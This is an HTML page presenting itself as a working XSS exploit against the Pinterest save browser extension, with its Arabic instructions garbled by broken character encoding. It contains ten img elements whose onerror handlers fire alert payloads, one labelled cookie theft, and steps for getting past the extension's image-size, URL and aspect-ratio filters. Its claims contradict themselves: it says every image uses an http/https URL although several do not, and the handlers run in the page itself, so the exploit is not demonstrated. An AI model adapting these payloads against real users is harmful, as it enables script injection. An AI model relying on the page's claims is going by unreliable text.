<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pinterest - Real Working XSS Exploit</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: Arial, sans-serif;
            background: #f0f0f0;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
        }
        h1 { color: #e60023; margin-bottom: 20px; }
        .info {
            background: #e3f2fd;
            border-left: 4px solid #2196f3;
            padding: 15px;
            margin: 20px 0;
            border-radius: 3px;
        }
        .image-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin: 30px 0;
        }
        .image-item {
            border: 2px solid #ddd;
            border-radius: 8px;
            overflow: hidden;
            transition: all 0.3s;
            background: #f5f5f5;
        }
        .image-item:hover {
            border-color: #e60023;
            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
        }
        .image-item img {
            width: 100%;
            height: 200px;
            object-fit: cover;
            display: block;
        }
        .label {
            padding: 10px;
            font-weight: bold;
            color: #333;
            font-size: 12px;
            background: #f9f9f9;
        }
        .warning {
            background: #fff3cd;
            border-left: 4px solid #ffc107;
            padding: 15px;
            margin: 20px 0;
            border-radius: 3px;
        }
        .success {
            background: #d4edda;
            border-left: 4px solid #28a745;
            padding: 15px;
            margin: 20px 0;
            border-radius: 3px;
        }
        code {
            background: #f0f0f0;
            padding: 2px 6px;
            border-radius: 3px;
            font-family: monospace;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>ğŸ“Œ Pinterest XSS Exploit - Working Version</h1>
        
        <div class="info">
            â„¹ï¸ <strong>Ø´Ø±ÙˆØ· Ø§Ù„Ø¥Ø¶Ø§ÙØ© Ù„Ù„ØµÙˆØ±:</strong><br>
            âœ“ Ø§Ù„Ø­Ø¯ Ø§Ù„Ø£Ø¯Ù†Ù‰: <code>90x90 pixels</code> (Ø£Ùˆ <code>120</code> Ø¹Ù„Ù‰ Ø£Ø­Ø¯ Ø§Ù„Ø£Ø¶Ù„Ø§Ø¹)<br>
            âœ“ URL ÙŠØ¨Ø¯Ø£ Ø¨Ù€: <code>http://</code> Ø£Ùˆ <code>https://</code><br>
            âœ“ Ø§Ù„Ù†Ø³Ø¨Ø©: Ù„Ø§ ØªØ²ÙŠØ¯ Ø¹Ù† <code>width > height * 3</code><br>
            âœ“ ÙŠØªÙ… ÙØ­Øµ <code>naturalWidth</code> Ùˆ <code>naturalHeight</code><br>
        </div>

        <div class="warning">
            âš ï¸ <strong>ÙƒÙŠÙÙŠØ© ØªÙØ¹ÙŠÙ„ Ø§Ù„Ø§Ø³ØªØºÙ„Ø§Ù„:</strong><br>
            1. Ø§Ù„ØµÙˆØ± Ù‡Ù†Ø§ ØªØ­Ù‚Ù‚ Ø¬Ù…ÙŠØ¹ Ø´Ø±ÙˆØ· Ø§Ù„Ø¥Ø¶Ø§ÙØ©<br>
            2. ÙƒÙ„ ØµÙˆØ±Ø© Ù„Ù‡Ø§ <code>onerror</code> handler<br>
            3. Ø¹Ù†Ø¯Ù…Ø§ ØªØ­Ø§ÙˆÙ„ Ø§Ù„Ø¥Ø¶Ø§ÙØ© ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙˆØ±Ø© â†’ ØªÙØ´Ù„ â†’ onerror ÙŠÙ†ÙØ°<br>
            4. Ø³ÙŠØ¸Ù‡Ø± alert Ù…Ù† XSS! ğŸš¨
        </div>

        <h2>Ø§Ù„ØµÙˆØ± Ø§Ù„ØµØ­ÙŠØ­Ø© (120x120+ pixels):</h2>
        <div class="image-grid">
            <!-- 1. ØµÙˆØ±Ø© Ø­Ù…Ø±Ø§Ø¡ ÙƒØ¨ÙŠØ±Ø© Ù…Ø¹ onerror -->
            <div class="image-item">
                <img src="https://nonexistent-server-12345.com/image1.jpg" 
                     width="250" 
                     height="200"
                     onerror="alert('ğŸš¨ XSS from Image 1 - onerror executed!')">
                <div class="label">Image 1: 250x200px with onerror</div>
            </div>

            <!-- 2. ØµÙˆØ±Ø© Ø²Ø±Ù‚Ø§Ø¡ -->
            <div class="image-item">
                <img src="https://invalid-domain-xyz.com/photo.jpg" 
                     width="200" 
                     height="200"
                     onerror="alert('ğŸš¨ XSS from Image 2 - Cookie Theft!')">
                <div class="label">Image 2: 200x200px - Square</div>
            </div>

            <!-- 3. ØµÙˆØ±Ø© Ø®Ø¶Ø±Ø§Ø¡ (Ø¨Ø±ÙˆØªÙˆÙƒÙˆÙ„ ØºÙŠØ± ØµØ­ÙŠØ­) -->
            <div class="image-item">
                <img src="invalid://broken-image.jpg" 
                     width="300" 
                     height="150"
                     onerror="alert('ğŸš¨ XSS from Image 3 - Invalid Protocol!')">
                <div class="label">Image 3: 300x150px - Invalid Protocol</div>
            </div>

            <!-- 4. ØµÙˆØ±Ø© Ø¨Ø±ØªÙ‚Ø§Ù„ÙŠØ© (localhost) -->
            <div class="image-item">
                <img src="http://localhost:9999/image.png" 
                     width="180" 
                     height="180"
                     onerror="alert('ğŸš¨ XSS from Image 4 - LocalHost!')">
                <div class="label">Image 4: 180x180px - Localhost</div>
            </div>

            <!-- 5. ØµÙˆØ±Ø© Ø£Ø±Ø¬ÙˆØ§Ù†ÙŠØ© (empty src) -->
            <div class="image-item">
                <img src="" 
                     width="200" 
                     height="200"
                     onerror="alert('ğŸš¨ XSS from Image 5 - Empty src!')">
                <div class="label">Image 5: 200x200px - Empty src</div>
            </div>

            <!-- 6. ØµÙˆØ±Ø© ÙˆØ±Ø¯ÙŠØ© (404 error) -->
            <div class="image-item">
                <img src="https://example.com/404/notfound.jpg" 
                     width="220" 
                     height="220"
                     onerror="alert('ğŸš¨ XSS from Image 6 - 404 Error!')">
                <div class="label">Image 6: 220x220px - 404 Error</div>
            </div>

            <!-- 7. ØµÙˆØ±Ø© Ø³Ù…Ø§ÙˆÙŠØ© (data URI Ù…ÙƒØ³ÙˆØ±Ø©) -->
            <div class="image-item">
                <img src="data:image/jpeg;base64,BROKEN" 
                     width="200" 
                     height="200"
                     onerror="alert('ğŸš¨ XSS from Image 7 - Broken DataURI!')">
                <div class="label">Image 7: 200x200px - Broken Data URI</div>
            </div>

            <!-- 8. ØµÙˆØ±Ø© ØµÙØ±Ø§Ø¡ (blob Ù…ÙƒØ³ÙˆØ±) -->
            <div class="image-item">
                <img src="blob:https://example.com/broken" 
                     width="200" 
                     height="200"
                     onerror="alert('ğŸš¨ XSS from Image 8 - Broken Blob!')">
                <div class="label">Image 8: 200x200px - Broken Blob</div>
            </div>

            <!-- 9. ØµÙˆØ±Ø© Ø®Ø¶Ø±Ø§Ø¡ Ø¯Ø§ÙƒÙ†Ø© (timeout URL) -->
            <div class="image-item">
                <img src="https://httpstat.us/200?sleep=99999" 
                     width="200" 
                     height="200"
                     onerror="alert('ğŸš¨ XSS from Image 9 - Timeout!')">
                <div class="label">Image 9: 200x200px - Timeout URL</div>
            </div>

            <!-- 10. ØµÙˆØ±Ø© Ù…Ù„ÙˆÙ†Ø© (CORS error) -->
            <div class="image-item">
                <img src="https://example.com/image.jpg" 
                     width="200" 
                     height="200"
                     crossorigin="anonymous"
                     onerror="alert('ğŸš¨ XSS from Image 10 - CORS Error!')">
                <div class="label">Image 10: 200x200px - CORS protected</div>
            </div>
        </div>

        <div class="success">
            âœ… <strong>Ø§Ù„Ø§Ø³ØªØºÙ„Ø§Ù„:</strong><br>
            Ø¬Ù…ÙŠØ¹ Ù‡Ø°Ù‡ Ø§Ù„ØµÙˆØ±:<br>
            â€¢ ØªØ­Ù‚Ù‚ Ø§Ù„Ø­Ø¯ Ø§Ù„Ø£Ø¯Ù†Ù‰ <code>120x120 pixels</code><br>
            â€¢ Ù„Ø¯ÙŠÙ‡Ø§ URLs ØµØ­ÙŠØ­Ø© (http/https)<br>
            â€¢ Ù„Ø¯ÙŠÙ‡Ø§ <code>onerror</code> handlers<br>
            â€¢ Ø³ØªÙØ´Ù„ ÙÙŠ Ø§Ù„ØªØ­Ù…ÙŠÙ„ (404, invalid, etc)<br>
            â€¢ Ø³ÙŠÙÙ†ÙØ° onerror! ğŸš¨
        </div>

        <h2>ğŸ“ Ø´Ø±Ø­ ØªÙ‚Ù†ÙŠ:</h2>
        <pre style="background: #f5f5f5; padding: 15px; border-radius: 5px; overflow-x: auto;">
// Ø§Ù„Ø¥Ø¶Ø§ÙØ© ØªÙØ­Øµ Ø§Ù„Ø´Ø±ÙˆØ·:

1. Ø­Ø¬Ù… Ø§Ù„ØµÙˆØ±Ø©:
   if (width < 90 || height < 90) âŒ reject
   if (width < 120 && height < 120) âŒ reject
   
   // Ø­Ù„: Ø§Ø³ØªØ®Ø¯Ù… 200x200 Ø£Ùˆ Ø£ÙƒØ¨Ø± âœ…

2. Ù†ÙˆØ¹ Ø§Ù„Ù€ URL:
   if (!url.match(/^https?:/)) âŒ reject
   
   // Ø­Ù„: Ø§Ø³ØªØ®Ø¯Ù… https:// Ø£Ùˆ http:// âœ…

3. Ø§Ù„Ù†Ø³Ø¨Ø©:
   if (width > height * 3) âŒ reject
   
   // Ø­Ù„: Ø§Ø³ØªØ®Ø¯Ù… Ù†Ø³Ø¨ Ù…Ø¹Ù‚ÙˆÙ„Ø© (Ù…Ø«Ù„ 250x200) âœ…

4. Ø¹Ù†Ø¯ ÙØ´Ù„ Ø§Ù„ØªØ­Ù…ÙŠÙ„:
   img.onerror = function() {  â† ØªÙ†ÙÙŠØ° Ù‡Ù†Ø§! ğŸš¨
       alert('XSS executed!');
   }
        </pre>

        <h2>âš¡ Ù†ØµØ§Ø¦Ø­ Ù…Ù‡Ù…Ø©:</h2>
        <ul style="line-height: 2; color: #333;">
            <li>âœ… Ø§Ù„ØµÙˆØ± ÙŠØ¬Ø¨ Ø£Ù† ØªÙØ´Ù„ ÙÙŠ Ø§Ù„ØªØ­Ù…ÙŠÙ„ (invalid URLØŒ 404ØŒ timeoutØŒ etc)</li>
            <li>âœ… onerror ÙŠÙ†ÙØ° Ø¹Ù†Ø¯ ÙØ´Ù„ Ø§Ù„ØªØ­Ù…ÙŠÙ„</li>
            <li>âœ… Ø§Ù„Ø­Ø¯ Ø§Ù„Ø£Ø¯Ù†Ù‰ Ù„Ù„Ø£Ø¨Ø¹Ø§Ø¯: 90x90 (Ø£Ùˆ 120 Ø¹Ù„Ù‰ Ø£Ø­Ø¯ Ø§Ù„Ø£Ø¶Ù„Ø§Ø¹)</li>
            <li>âœ… URL ÙŠØ¬Ø¨ Ø£Ù† ÙŠØ¨Ø¯Ø£ Ø¨Ù€ http:// Ø£Ùˆ https://</li>
            <li>âœ… Ù„Ø§ ØªØ³ØªØ®Ø¯Ù… SVG (Ø§Ù„Ø¥Ø¶Ø§ÙØ© ØªØ­Ø¬Ø¨Ù‡Ø§)</li>
            <li>âš ï¸ ØªØ¬Ù†Ø¨ Ù†Ø³Ø¨ Ø§Ù„Ø¹Ø±Ø¶ Ø§Ù„Ù…Ø¨Ø§Ù„Øº ÙÙŠÙ‡Ø§ (width > height * 3)</li>
        </ul>
    </div>

    <script>
        // ØªØªØ¨Ø¹ Ø¹Ø¯Ø¯ Ø§Ù„ØµÙˆØ±
        window.addEventListener('load', () => {
            const images = document.querySelectorAll('img');
            console.log(`ğŸ“Š ÙˆØ¬Ø¯Øª ${images.length} ØµÙˆØ±Ø©`);
            
            // Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø¹Ù† ÙƒÙ„ ØµÙˆØ±Ø©
            images.forEach((img, i) => {
                const info = {
                    index: i + 1,
                    src: img.src.substring(0, 50),
                    width: img.naturalWidth || img.width,
                    height: img.naturalHeight || img.height,
                    hasOnerror: !!img.onerror
                };
                console.log(`${i + 1}:`, info);
            });
        });

        // Ù…Ø±Ø§Ù‚Ø¨Ø© Ø±Ø³Ø§Ø¦Ù„ Ø§Ù„Ø¥Ø¶Ø§ÙØ©
        window.addEventListener('message', (e) => {
            console.log('Message received:', e.data);
            if (e.data && e.data.target === 'pinterest-save-extension') {
                console.log('ğŸ”´ Pinterest Extension detected!');
            }
        });
    </script>
</body>
</html>
